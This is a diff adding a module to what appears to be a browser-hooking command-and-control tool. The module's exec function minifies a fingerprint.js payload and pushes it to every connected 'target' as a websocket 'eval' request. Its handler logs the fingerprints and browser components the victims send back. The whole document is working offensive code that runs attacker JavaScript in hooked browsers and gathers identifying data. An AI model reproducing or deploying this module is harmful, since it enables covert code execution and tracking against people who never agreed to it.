@@ -1,0 +1,32 @@
+exports.data = {
+	//info about the module
+	info: function(step /*optional */) {
+		console.log("Fingerprints the browser");
+		console.log("Type exec to send the payload");
+	},
+
+	//handler for parsing responses
+	handler: function(options, connection, obj) {
+		if ("fingerprint" in obj) {
+			connection.fingerprint=obj.fingerprint
+			connection.name += '-'+obj.fingerprint;
+			console.log("");
+			console.log('['+connection.name+'] FINGERPRINT: Received fingerprint');
+		} else if ("components" in obj) {
+			connection.components=obj.components
+			console.log("");
+			console.log('['+connection.name+'] FINGERPRINT: Received components');
+		}
+	},
+
+	//execute the attack
+	exec: function(options,targets,step /* optional */) {
+		var fs = require('fs');
+		var UglifyJS = require("uglify-js");
+		var payload = UglifyJS.minify(fs.readFileSync(__dirname + '/../payloads/fingerprint.js','utf8'),{ie8:true}).code; //TODO ERROR CHECK
+		for (var i in targets) {
+			targets[i].sendUTF(JSON.stringify({ request: 'eval', content: payload }));
+		}
+		console.log('Payload sent')
+	}
+};
